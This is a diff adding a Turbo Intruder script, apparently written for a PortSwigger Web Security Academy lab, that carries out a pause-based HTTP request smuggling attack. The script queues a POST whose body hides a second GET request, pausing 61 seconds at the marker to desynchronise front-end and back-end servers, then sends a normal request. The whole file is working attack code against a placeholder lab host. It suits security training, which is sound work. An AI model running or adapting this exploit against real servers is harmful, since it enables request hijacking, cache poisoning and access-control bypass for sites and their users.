@@ -1,0 +1,33 @@
+def queueRequests(target, _):
+    engine = RequestEngine(endpoint="https://YOUR-LAB-ID.web.web-security-academy.net:443",
+                           concurrentConnections=1,
+                           requestsPerConnection=100,
+                           pipeline=False
+                           )
+    
+    # attack request
+    attack_request = """POST /resources HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+Content-Length: %s
+
+%s"""
+ 
+    # smuggled request GET
+    smuggled_request = """GET /404/ HTTP/1.1
+Host: YOUR-LAB-ID.web.web-security-academy.net
+
+"""
+ 
+    # normal request
+    normal_request = """GET / HTTP/1.1
+Host: YOUR-LAB-ID.web.web-security-academy.net
+
+"""
+    engine.queue(attack_request, [len(smuggled_request), smuggled_request], pauseMarker=['\r\n\r\nGET'], pauseTime=61000)
+    engine.queue(normal_request)
+ 
+ 
+def handleResponse(req, _):
+    table.add(req)
